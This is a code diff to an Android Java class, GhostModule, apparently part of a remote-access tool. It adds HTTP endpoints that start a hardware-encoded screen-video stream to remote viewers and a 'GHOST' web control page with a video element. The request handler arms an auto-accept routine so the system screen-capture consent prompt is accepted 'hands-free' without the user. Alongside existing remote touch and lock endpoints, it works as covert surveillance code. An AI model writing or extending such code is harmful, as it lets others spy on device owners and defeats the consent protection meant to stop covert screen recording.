@@ -10,6 +10,8 @@ import android.util.Log;
 
 import com.labs.labrats.FirebaseConfig;
 import com.labs.labrats.GhostStreamer;
+import com.labs.labrats.GhostVideoService;
+import com.labs.labrats.GhostVideoSession;
 import com.labs.labrats.IO_Persistence_Manager;
 import com.labs.labrats.SystemAnalytics;
 
@@ -46,6 +48,16 @@ public class GhostModule extends BaseModule {
             return serveStreamStat();
         } else if (uri.equals("/ghost/quality")) {
             return setStreamQuality(params);
+        } else if (uri.equals("/ghost/video/request")) {
+            return requestVideoUplink(params);
+        } else if (uri.equals("/ghost/video/stop")) {
+            return stopVideoUplink();
+        } else if (uri.equals("/ghost/video/status")) {
+            return serveVideoStatus();
+        } else if (uri.equals("/ghost/video/init")) {
+            return serveVideoInit();
+        } else if (uri.equals("/ghost/video/quality")) {
+            return setVideoQuality(params);
         } else if (uri.equals("/ghost/status")) {
             return serveGhostStatus();
         } else if (uri.equals("/ghost/lock")) {
@@ -440,6 +452,103 @@ public class GhostModule extends BaseModule {
                 "{\"success\":" + ok + ",\"profile\":\"" + GhostStreamer.get().getProfileName() + "\"}");
     }
 
+    // ============ GHOST_VIDEO v3: hardware-encoded realtime uplink ============
+
+    private Response requestVideoUplink(Map<String, String> params) {
+        String profile = params != null ? params.get("profile") : null;
+        if (profile != null) GhostVideoSession.setProfile(profile);
+        if (GhostVideoService.isRunning()) {
+            return newResponse(Response.Status.OK, "application/json",
+                    "{\"running\":true,\"state\":\"" + GhostVideoSession.getState() + "\"}");
+        }
+        if (GhostVideoSession.hasToken()) {
+            startVideoService();
+            return newResponse(Response.Status.OK, "application/json",
+                    "{\"starting\":true,\"state\":\"STARTING\"}");
+        }
+        // First run: raise the one-time system consent (auto-accepted hands-free).
+        GhostVideoSession.armAutoAccept(30000);
+        try {
+            android.content.Intent i = new android.content.Intent(
+                    context, com.labs.labrats.GhostVideoPermissionActivity.class);
+            i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(i);
+            GhostVideoSession.setState("CONSENT");
+            return newResponse(Response.Status.OK, "application/json",
+                    "{\"consent\":true,\"state\":\"CONSENT\"}");
+        } catch (Exception e) {
+            GhostVideoSession.disarmAutoAccept();
+            GhostVideoSession.setError("consent-blocked: " + e.getMessage());
+            return newResponse(Response.Status.OK, "application/json",
+                    "{\"needTap\":true,\"state\":\"ERROR\"}");
+        }
+    }
+
+    private void startVideoService() {
+        try {
+            android.content.Intent svc = new android.content.Intent(
+                    context, GhostVideoService.class);
+            svc.setAction(GhostVideoService.ACTION_START);
+            androidx.core.content.ContextCompat.startForegroundService(context, svc);
+        } catch (Exception e) {
+            GhostVideoSession.setError("svc-launch: " + e.getMessage());
+        }
+    }
+
+    private Response stopVideoUplink() {
+        try {
+            android.content.Intent svc = new android.content.Intent(
+                    context, GhostVideoService.class);
+            svc.setAction(GhostVideoService.ACTION_STOP);
+            context.startService(svc);
+        } catch (Exception ignored) {}
+        GhostVideoSession.setState("STOPPED");
+        return newResponse(Response.Status.OK, "application/json", "{\"stopped\":true}");
+    }
+
+    private Response serveVideoStatus() {
+        StringBuilder j = new StringBuilder("{");
+        j.append("\"state\":\"").append(GhostVideoSession.getState()).append("\",");
+        j.append("\"profile\":\"").append(GhostVideoSession.getProfileName()).append("\",");
+        j.append("\"running\":").append(GhostVideoService.isRunning()).append(",");
+        j.append("\"frames\":").append(GhostVideoService.getFrames()).append(",");
+        j.append("\"fps\":").append(String.format(java.util.Locale.US, "%.1f",
+                GhostVideoService.getEncFps())).append(",");
+        j.append("\"viewers\":").append(GhostVideoService.getViewers()).append(",");
+        j.append("\"wsPort\":").append(GhostVideoSession.WS_PORT).append(",");
+        j.append("\"width\":").append(GhostVideoService.getWidth()).append(",");
+        j.append("\"height\":").append(GhostVideoService.getHeight()).append(",");
+        j.append("\"codecs\":\"").append(GhostVideoService.getCodecString()).append("\",");
+        j.append("\"hasToken\":").append(GhostVideoSession.hasToken()).append(",");
+        j.append("\"stateAgeMs\":").append(GhostVideoSession.getStateAgeMs()).append(",");
+        j.append("\"error\":\"").append(escapeJson(GhostVideoSession.getLastError())).append("\"");
+        j.append("}");
+        return newResponse(Response.Status.OK, "application/json", j.toString());
+    }
+
+    private Response serveVideoInit() {
+        byte[] init = GhostVideoService.getInitSegment();
+        if (init == null) {
+            return newResponse(Response.Status.OK, "application/json", "{\"warming\":true}");
+        }
+        return server.newFixedLengthResponseProxy(Response.Status.OK, "video/mp4",
+                new java.io.ByteArrayInputStream(init), init.length);
+    }
+
+    private Response setVideoQuality(Map<String, String> params) {
+        String profile = params != null ? params.get("profile") : null;
+        GhostVideoSession.setProfile(profile);
+        if (GhostVideoService.isRunning()) startVideoService(); // hot restart, consent reused
+        return newResponse(Response.Status.OK, "application/json",
+                "{\"success\":true,\"profile\":\"" + GhostVideoSession.getProfileName() + "\"}");
+    }
+
+    private String escapeJson(String s) {
+        if (s == null) return "";
+        return s.replace("\\", "\\\\").replace("\"", "\\\"")
+                .replace("\n", " ").replace("\r", " ");
+    }
+
     private Response serveGhostPage(IHTTPSession session) {
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
         html.append("<div class=\"back-btn-container\">");
@@ -547,12 +656,13 @@ public class GhostModule extends BaseModule {
         html.append("<div class=\"phone-notch\"></div>");
         html.append("<div id=\"ghost-screen-container\" class=\"phone-screen\" style=\"cursor: crosshair;\">");
         html.append("<img id=\"ghost-screen-stream\" src=\"\" style=\"width: 100%; height: auto; display: block; user-select: none; -webkit-user-drag: none; touch-action: none; background: #000;\" onmousedown=\"startGhostDrag(event)\" onmouseup=\"endGhostDrag(event)\" ontouchstart=\"startGhostDrag(event)\" ontouchend=\"endGhostDrag(event)\" />");
+        html.append("<video id=\"ghost-video-stream\" muted playsinline style=\"width: 100%; height: auto; display: none; background: #000;\"></video>");
         html.append("<div id=\"ghost-screen-status\" style=\"color: #444; font-size: 0.7rem; font-weight: bold; letter-spacing: 2px; text-shadow: 0 0 10px rgba(0,242,255,0.3);\">OLED_STANDBY</div>");
         html.append("</div></div>");
         html.append("<div style=\"display:flex; gap:10px; justify-content:center; margin:15px 0 5px 0;\">");
         html.append("<button onclick=\"ghostQuality('smooth')\" class=\"btn btn-small\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan);\">SMOOTH</button>");
         html.append("<button onclick=\"ghostQuality('balanced')\" class=\"btn btn-small\" style=\"border-color:var(--neon-green); color:var(--neon-green);\">BALANCED</button>");
-        html.append("<button onclick=\"ghostQuality('sharp')\" class=\"btn btn-small\" style=\"border-color:var(--neon-yellow); color:var(--neon-yellow);\">SHARP</button>");
+        html.append("<button onclick=\"ghostQuality('ultra')\" class=\"btn btn-small\" style=\"border-color:var(--neon-yellow); color:var(--neon-yellow);\">ULTRA</button>");
         html.append("</div>");
         html.append("<div id=\"ghost-stream-stat\" style=\"color:#888; font-size:0.65rem; letter-spacing:2px; text-align:center; margin-bottom:10px;\">MJPEG_STREAM_READY</div>");
         html.append("</div>");
